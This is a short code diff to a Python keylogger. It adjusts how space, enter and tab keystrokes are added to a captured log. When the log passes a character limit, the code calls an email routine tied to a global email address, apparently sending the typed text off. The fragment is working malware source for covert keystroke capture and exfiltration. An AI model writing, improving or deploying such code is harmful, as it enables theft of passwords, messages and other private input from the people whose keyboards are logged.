@@ -34,14 +34,15 @@ def on_press(key):
     global emailAddr
 
     #filters for certain keys 
-    if key == Key.space or key == Key.enter or key == Key.tab:
-        word += ''
+    if key == Key.space or key == Key.enter:
+        word += ' '
         key_log += word
         word = ''
         if len(key_log) >= character_lim:
             email_log()
             key_log = ''
-    
+    elif key == Key.tab:
+        word ='     '
     elif key == Key.shift_r or key == Key.shift_l:
         return
     elif key == Key.backspace:
